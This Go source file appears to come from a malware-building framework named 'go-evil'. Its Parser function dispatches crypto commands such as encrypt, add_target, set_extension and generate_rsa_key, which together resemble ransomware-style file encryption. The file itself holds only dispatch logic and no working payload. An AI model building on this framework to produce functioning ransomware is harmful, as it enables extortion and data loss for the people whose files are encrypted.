package main

import (
	"fmt"

	"github.com/DennisTheodoreNedry/go-evil/domains/crypto/configuration"
	"github.com/DennisTheodoreNedry/go-evil/domains/crypto/decrypt"
	"github.com/DennisTheodoreNedry/go-evil/domains/crypto/encrypt"
	"github.com/DennisTheodoreNedry/go-evil/domains/crypto/generate"
	"github.com/DennisTheodoreNedry/go-evil/domains/crypto/target"
	"github.com/DennisTheodoreNedry/go-evil/utility/structure/json"
	notify "github.com/DennisTheodoreNedry/notify_handler"
)

func Parser(function string, value string, data_object *json.Json_t) []string {
	call := []string{}

	switch function {
	case "encrypt":
		call = encrypt.Encrypt(value, data_object)

	case "set_method":
		call = configuration.Set_crypto(value, data_object)

	case "set_aes_key":
		call = configuration.Set_aes_key(value, data_object)

	case "generate_aes_key":
		call = generate.AES_key(value, data_object)

	case "generate_rsa_key":
		call = generate.RSA_key(value, data_object)

	case "add_target":
		call = target.Add(value, data_object)

	case "set_extension":
		call = configuration.Set_extension(value, data_object)

	case "decrypt":
		call = decrypt.Decrypt(value, data_object)

	case "clean_targets":
		call = target.Clean(value, data_object)

	default:
		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "crypto.Parser()", 1)

	}

	return call
}
